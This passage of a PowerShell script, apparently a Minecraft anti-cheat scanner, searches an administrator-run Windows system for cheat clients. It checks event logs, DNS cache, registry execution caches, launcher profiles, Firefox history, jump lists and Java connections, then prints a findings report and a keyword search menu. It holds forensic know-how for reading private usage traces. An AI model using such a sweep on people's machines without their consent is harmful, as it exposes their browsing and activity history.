if ($m) { Add-Hit "CRIT" "DLL" "Injected: $m" "PID: $($p.Id)" }
}
} catch { }
}
}

function Scan-JavaNet {
if (Test-Timeout) { return }
$jp = Get-Process -Name "java","javaw" -EA SilentlyContinue
if (-not $jp) { return }
foreach ($p in @($jp)) {
try {
Get-NetTCPConnection -OwningProcess $p.Id -EA SilentlyContinue | Where-Object { $_.State -eq "Established" -and $_.RemoteAddress -notin @("127.0.0.1","::1") } | Select-Object -First 5 | ForEach-Object {
Add-Hit "INFO" "Network" "Connection" "PID: $($p.Id) | $($_.RemoteAddress):$($_.RemotePort)"
}
} catch { }
}
}

function Scan-EventLog {
if (Test-Timeout) { return }
try {
$count = 0
Get-WinEvent -FilterHashtable @{LogName = 'Security'; Id = 4688} -MaxEvents 5000 -EA SilentlyContinue | ForEach-Object {
if ($count -ge 20 -or (Test-Timeout)) { return }
$msg = $_.Message
if (-not $msg) { return }
$m = Match-Cheat $msg $script:ExactCheats
if ($m) { Add-Hit "CRIT" "EventLog" "Executed: $m" $_.TimeCreated.ToString('dd.MM.yy HH:mm'); $count++ }
}
} catch { }
}

function Scan-DNS {
if (Test-Timeout) { return }
try {
Get-DnsClientCache -EA SilentlyContinue | ForEach-Object {
if (Test-Timeout) { return }
foreach ($d in $script:CheatDomains) { if ($_.Entry -match [regex]::Escape($d)) { Add-Hit "CRIT" "DNS" "Cheat domain" $_.Entry } }
$m = Match-Cheat $_.Entry $script:ExactCheats
if ($m) { Add-Hit "SUSP" "DNS" "Suspicious: $m" $_.Entry }
}
} catch { }
}

function Scan-Hosts {
if (Test-Timeout) { return }
$hp = "$env:SystemRoot\System32\drivers\etc\hosts"
if (-not (Test-Path $hp)) { return }
try {
$lines = Get-Content $hp -EA SilentlyContinue
$custom = $lines | Where-Object { $_ -notmatch '^\s*#' -and $_ -match '\S' -and $_ -notmatch 'localhost' }
if ($custom.Count -gt 3) { Add-Hit "SUSP" "Hosts" "Modified hosts file" "($($custom.Count)) entries" }
} catch { }
}

function Scan-Profiles {
if (Test-Timeout) { return }
foreach ($mc in (Get-MCPaths)) {
$pp = Join-Path $mc "launcher_profiles.json"
if (-not (Test-Path $pp)) { continue }
try {
$json = Get-Content $pp -Raw -Encoding UTF8 | ConvertFrom-Json
if (-not $json.profiles) { continue }
$json.profiles.PSObject.Properties | ForEach-Object {
if (Test-Timeout) { return }
$pn = $_.Name; $pv = $_.Value
$m = Match-Cheat $pn $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Profile" "Cheat profile: $m" "" }
if ($pv.lastVersionId) { $m2 = Match-Cheat $pv.lastVersionId $script:ExactCheats; if ($m2) { Add-Hit "CRIT" "Profile" "Cheat version: $m2" "" } }
if ($pv.javaArgs -and $pv.javaArgs -match "-javaagent") { Add-Hit "CRIT" "Profile" "JavaAgent in args" $pn }
}
} catch { }
}
}

function Scan-InstalledLaunchers {
if (Test-Timeout) { return }
$suspList = @("FLauncher","ExLoader")
foreach ($l in $script:Launchers) {
foreach ($p in $l.P) {
if (Test-Path $p) {
Add-Hit "INFO" "Launcher" "Found: $($l.N)" $p
if ($l.N -in $suspList) { Add-Hit "SUSP" "Launcher" "Risky: $($l.N)" "Often used for cheats" }
break
}
}
}
}

function Scan-Uninstall {
if (Test-Timeout) { return }
foreach ($rp in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")) {
if (-not (Test-Path $rp)) { continue }
Get-ChildItem $rp -EA SilentlyContinue | ForEach-Object {
if (Test-Timeout) { return }
try { $props = Get-ItemProperty $_.PSPath -EA SilentlyContinue; if (-not $props.DisplayName) { return }; $m = Match-Cheat $props.DisplayName $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Installed" "Program: $m" $props.DisplayName } } catch { }
}
}
}

function Scan-Timestamps {
if (Test-Timeout) { return }
foreach ($mc in (Get-MCPaths)) {
$mp = Join-Path $mc "mods"
if (-not (Test-Path $mp)) { continue }
Get-ChildItem $mp -File -EA SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 40 | ForEach-Object {
if (Test-Timeout) { return }
$m = Match-Cheat $_.Name $script:ExactCheats
if ($m) { Add-Hit "CRIT" "Mods" "Cheat mod: $m" "Modified: $(Get-TimeAgo $_.LastWriteTime)" }
}
}
}

function Scan-MUICache {
if (Test-Timeout) { return }
$mp = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
if (-not (Test-Path $mp)) { return }
try { $vals = Get-ItemProperty $mp -EA SilentlyContinue; $vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { if (Test-Timeout) { return }; $m = Match-Cheat ($_.Name + " " + $_.Value) $script:ExactCheats; if ($m) { Add-Hit "CRIT" "MUI" "Cached: $m" "" } } } catch { }
}

function Scan-ShimCache {
if (Test-Timeout) { return }
$shimPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
if (-not (Test-Path $shimPath)) { return }
try { $data = Get-ItemProperty $shimPath -EA SilentlyContinue; if ($data.AppCompatCache) { $str = [System.Text.Encoding]::Unicode.GetString($data.AppCompatCache); $m = Match-Cheat $str $script:ExactCheats; if ($m) { Add-Hit "CRIT" "ShimCache" "Found trace: $m" "" } } } catch { }
}

function Scan-Startup {
if (Test-Timeout) { return }
$startupPaths = @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup","$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
foreach ($sp in $startupPaths) {
if (Test-Timeout) { return }
if ($sp -match "^HKCU:|^HKLM:") {
if (Test-Path $sp) { try { $vals = Get-ItemProperty $sp -EA SilentlyContinue; $vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { $m = Match-Cheat ($_.Name + " " + $_.Value) $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Startup" "Auto-run: $m" "" } } } catch { } }
} elseif (Test-Path $sp) { Get-ChildItem $sp -File -EA SilentlyContinue | ForEach-Object { $m = Match-Cheat $_.Name $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Startup" "Auto-run: $m" $_.FullName } } }
}
}

function Scan-Tasks {
if (Test-Timeout) { return }
try { Get-ScheduledTask -EA SilentlyContinue | ForEach-Object { if (Test-Timeout) { return }; $m = Match-Cheat $_.TaskName $script:ExactCheats; if ($m) { Add-Hit "CRIT" "Tasks" "Scheduled: $m" $_.TaskPath } } } catch { }
}

function Scan-Services {
if (Test-Timeout) { return }
}

function Show-EverythingMenu {
    Write-Host ""
    Write-Host ""
    Show-DoubleLine "White" 60
    Write-Center "EVERYTHING SEARCH OPTIONS" "White"
    Show-DoubleLine "White" 60
    Write-Host ""
    Write-Host "  [1] DoomsDay check (.jar 1.8mb-2.6mb)" -ForegroundColor White
    Write-Host "  [2] Cheat names search" -ForegroundColor White
    Write-Host "  [0] Exit" -ForegroundColor Gray
    Write-Host ""
    Show-Line "Gray" 60
    
    while ($true) {
        Write-Host ""
        Write-Host " Select option (0-2): " -NoNewline -ForegroundColor Gray
        
        $choice = Read-Host
        
        if ($choice -eq "1") {
            Write-Host " Opening Everything with DoomsDay filter..." -ForegroundColor Gray
            try {
                $filter = ".jar size:1.8mb-2.6mb"
                Start-Process -FilePath $script:EverythingPath -ArgumentList "-search `"$filter`""
            } catch {
                Write-Host " Failed to open Everything" -ForegroundColor Red
            }
        }
        elseif ($choice -eq "2") {
            Write-Host " Opening Everything with cheat names..." -ForegroundColor Gray
            try {
                $filter = "Baritone|LiquidBounce|Wurst|GishCode|Inertia|Doomsday|Aristois|RusherHack|Zamorozka|Nursultan|Akrien|DeadCode|WEXSIDE|RichPremium|BleachHack|Kami|KamiBlue|Matix|Celestial|NightMare|BoberWare|ExLoader|celka|Expensive|BebraWare|Minced|NeverHook|Vape|Dreampool|Hitbox|dauniblyat|Nurik|CortexClient|AimBot|FreeCam|Wise|Azura|3arthh4ck|AutoAttack|InventoryTotem|ViaVersion|ViaForge|AutoTotem|Excellent|X-Ray|Schematica|ReplayMod|ChestStealer|DiamondGen|killaura|bushroot|ZenWare|Flavor|Neat|Britva|InvMove|TopkaAutoBuy|XorekAutoBuy|TopkaAutoSell|XorekAutoMyst|TopkaCasino|AutoSell|ElytraAutoPilot|AdvancedCompass|Xaero|Minimap"
                Start-Process -FilePath $script:EverythingPath -ArgumentList "-search `"$filter`""
            } catch {
                Write-Host " Failed to open Everything" -ForegroundColor Red
            }
        }
        elseif ($choice -eq "0") {
            Write-Host " Exiting..." -ForegroundColor DarkGray
            break
        }
        else {
            Write-Host " Invalid option. Please select 0, 1, or 2." -ForegroundColor Red
        }
    }
}

function Scan-Browser {
if (Test-Timeout) { return }
$historyPaths = @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History","$env:APPDATA\Mozilla\Firefox\Profiles")
foreach ($hp in $historyPaths) {
if (Test-Timeout) { return }
if (Test-Path $hp) {
if ($hp -match "Firefox") {
Get-ChildItem $hp -Directory -EA SilentlyContinue | ForEach-Object {
$places = Join-Path $_.FullName "places.sqlite"
if (Test-Path $places) { $content = Get-Content $places -Raw -EA SilentlyContinue; if ($content) { foreach ($d in $script:CheatDomains) { if ($content -match [regex]::Escape($d)) { Add-Hit "SUSP" "Browser" "Firefox: $d" "" } } } }
}
}
}
}
}

function Scan-JumpLists {
if (Test-Timeout) { return }
$jumpPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
if (-not (Test-Path $jumpPath)) { return }
try { Get-ChildItem $jumpPath -File -EA SilentlyContinue | ForEach-Object { if (Test-Timeout) { return }; $content = Get-Content $_.FullName -Raw -EA SilentlyContinue; if ($content) { $m = Match-Cheat $content $script:ExactCheats; if ($m) { Add-Hit "CRIT" "JumpList" "Found: $m" $_.Name } } } } catch { }
}

function Show-Report {
$elapsed = if ($script:StartTime) { (Get-Date) - $script:StartTime } else { New-TimeSpan }
Write-Host ""
Write-Host ""
for ($i = 0; $i -lt 3; $i++) { $color = if ($i % 2 -eq 0) { "White" } else { "Gray" }; Show-DoubleLine $color 60; Start-Sleep -Milliseconds 60; $curPos = $Host.UI.RawUI.CursorPosition; $Host.UI.RawUI.CursorPosition = [System.Management.Automation.Host.Coordinates]::new(0, $curPos.Y - 1) }
Show-DoubleLine "White" 60
Write-Center "<< SCAN RESULTS >>" "White"
Show-DoubleLine "White" 60
Write-Host ""
if ($script:Criticals.Count -gt 0) {
Write-Host ""
Write-Host " [!] CRITICAL FINDINGS: $($script:Criticals.Count)" -ForegroundColor White
Show-Line "Gray" 55
Write-Host ""
$num = 1
foreach ($f in $script:Criticals | Select-Object -First 30) {
Write-Host " $num." -NoNewline -ForegroundColor Gray
Write-Host " [$($f.Module)] " -NoNewline -ForegroundColor DarkGray
Write-Host $f.Message -ForegroundColor White
if ($f.Details) { Write-Host " -- " -NoNewline -ForegroundColor Gray; Write-Host (CutStr $f.Details 55) -ForegroundColor DarkGray }
$num++
}

if ($script:Criticals.Count -gt 30) { Write-Host " ... and $($script:Criticals.Count - 30) more" -ForegroundColor DarkGray }
Write-Host ""
}
if ($script:Suspicious.Count -gt 0) {
Write-Host ""
Write-Host " [?] SUSPICIOUS: $($script:Suspicious.Count)" -ForegroundColor Gray
Show-Line "Gray" 55
Write-Host ""
$num = 1
foreach ($f in $script:Suspicious | Select-Object -First 15) {
Write-Host " $num." -NoNewline -ForegroundColor Gray
Write-Host " [$($f.Module)] " -NoNewline -ForegroundColor DarkGray
Write-Host $f.Message -ForegroundColor Gray
if ($f.Details) { Write-Host " -- " -NoNewline -ForegroundColor DarkGray; Write-Host (CutStr $f.Details 55) -ForegroundColor DarkGray }
$num++
}
Write-Host ""
}
if ($script:Infos.Count -gt 0 -or $script:LastDeleted -or $script:LastRecycleClear) {
Write-Host ""
Write-Host " [i] INFORMATION:" -ForegroundColor Gray
Show-Line "DarkGray" 55
Write-Host ""
foreach ($f in $script:Infos | Select-Object -First 10) { Write-Host " - [$($f.Module)] $($f.Message)" -ForegroundColor Gray }
if ($script:LastDeleted) { Write-Host " - [Trash] Last deleted: $($script:LastDeleted.Name)" -ForegroundColor Gray; Write-Host "   $(Get-TimeAgo $script:LastDeleted.Date)" -ForegroundColor DarkGray }
if ($script:LastRecycleClear) { Write-Host " - [Trash] Cleared: $(Get-TimeAgo $script:LastRecycleClear)" -ForegroundColor Gray }
Write-Host ""
}
Write-Host ""
Show-DoubleLine "Gray" 60
Write-Host ""
Write-Host " " -NoNewline
Write-Host "[!] Critical: " -NoNewline -ForegroundColor Gray
$critColor = if ($script:Criticals.Count -gt 0) { "Magenta" } else { "DarkGray" }; Write-Host "$($script:Criticals.Count)" -NoNewline -ForegroundColor $critColor
Write-Host " | " -NoNewline -ForegroundColor DarkGray
Write-Host "[?] Warn: " -NoNewline -ForegroundColor Gray
$suspColor = if ($script:Suspicious.Count -gt 0) { "DarkMagenta" } else { "DarkGray" }; Write-Host "$($script:Suspicious.Count)" -NoNewline -ForegroundColor $suspColor
Write-Host " | " -NoNewline -ForegroundColor DarkGray
Write-Host "[i] Info: " -NoNewline -ForegroundColor Gray
Write-Host "$($script:Infos.Count)" -ForegroundColor Gray
Write-Host ""
Write-Host " Scan completed in: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Gray
Write-Host ""
Show-DoubleLine "Gray" 60
}

Show-Banner

Show-DoubleLine "Gray" 60
Write-Host ""
Write-Host " [] Administrator: " -NoNewline -ForegroundColor Gray
Write-Host "Yes" -ForegroundColor White
Write-Host " [] Date: $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')" -ForegroundColor Gray
Write-Host " [] Computer: $env:COMPUTERNAME" -ForegroundColor Gray
Write-Host " [] User: $env:USERNAME" -ForegroundColor Gray
Show-Loading "Initializing scan engine" 45
Write-Host ""
Show-DoubleLine "White" 60
Write-Center "<< SCANNING SYSTEM >>" "White"
Show-DoubleLine "White" 60
Write-Host ""
$script:StartTime = Get-Date
$total = 37
Show-ProgressDots "Everything Search" 1 $total { Setup-Everything } -IsEverything
Show-ProgressDots "Everything Scan" 2 $total { Scan-WithEverything }
Show-ProgressDots "Minecraft folders" 3 $total { Scan-MCFolders }
Show-ProgressDots "Disk analysis" 4 $total { Scan-Disks }
Show-ProgressDots "AppData directories" 5 $total { Scan-AppData }
Show-ProgressDots "Recycle Bin" 6 $total { Scan-RecycleBin }
Show-ProgressDots "Recent files" 7 $total { Scan-RecentFiles }
Show-ProgressDots "LNK shortcuts" 8 $total { Scan-LNKFiles }
Show-ProgressDots "Windows.old" 9 $total { Scan-WindowsOld }
Show-ProgressDots "NTFS ADS streams" 10 $total { Scan-NTFSADS }
Show-ProgressDots "USN Journal (deep)" 11 $total { Scan-USNDeep }
Show-ProgressDots "Clipboard history" 12 $total { Scan-ClipboardHistory }
Show-ProgressDots "CMD/PS history" 13 $total { Scan-CMDHistory }
Show-ProgressDots "BITS downloads" 14 $total { Scan-BITS }
Show-ProgressDots "WER crash reports" 15 $total { Scan-WER }
Show-ProgressDots "Registry: UserAssist" 16 $total { Scan-UserAssist }
Show-ProgressDots "Registry: BAM/DAM" 17 $total { Scan-BAM }
Show-ProgressDots "Registry: Amcache" 18 $total { Scan-Amcache }
Show-ProgressDots "Prefetch analysis" 19 $total { Scan-Prefetch }
Show-ProgressDots "Active processes" 20 $total { Scan-Processes }
Show-ProgressDots "Java agent detection" 21 $total { Scan-JavaAgent }
Show-ProgressDots "DLL injection scan" 22 $total { Scan-DLL }
Show-ProgressDots "Java network traffic" 23 $total { Scan-JavaNet }
Show-ProgressDots "Security event log" 24 $total { Scan-EventLog }
Show-ProgressDots "DNS cache analysis" 25 $total { Scan-DNS }
Show-ProgressDots "Hosts file check" 26 $total { Scan-Hosts }
Show-ProgressDots "Launcher profiles" 27 $total { Scan-Profiles }
Show-ProgressDots "Installed launchers" 28 $total { Scan-InstalledLaunchers }
Show-ProgressDots "Uninstall registry" 29 $total { Scan-Uninstall }
Show-ProgressDots "Mod timestamps" 30 $total { Scan-Timestamps }
Show-ProgressDots "MUI Cache" 31 $total { Scan-MUICache }
Show-ProgressDots "Shim Cache" 32 $total { Scan-ShimCache }
Show-ProgressDots "Startup entries" 33 $total { Scan-Startup }
Show-ProgressDots "Scheduled tasks" 34 $total { Scan-Tasks }
Show-ProgressDots "Windows services" 35 $total { Scan-Services }
Show-ProgressDots "Browser traces" 36 $total { Scan-Browser }
Show-ProgressDots "Jump lists" 37 $total { Scan-JumpLists }
Write-Host ""
Show-Line "Gray" 60
Write-Host ""
$analyzing = " Processing results"
for ($i = 0; $i -lt 5; $i++) { Write-Host "`r$analyzing$('.' * ($i + 1)) " -NoNewline -ForegroundColor Gray; Start-Sleep -Milliseconds 300 }
Write-Host "`r$analyzing..... [DONE]" -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Show-Report

if ($script:EverythingReady -and $script:EverythingPath) {
    Show-EverythingMenu
}

Write-Host ""
Write-Host " Press Enter to exit..." -ForegroundColor Gray
$null = Read-Host
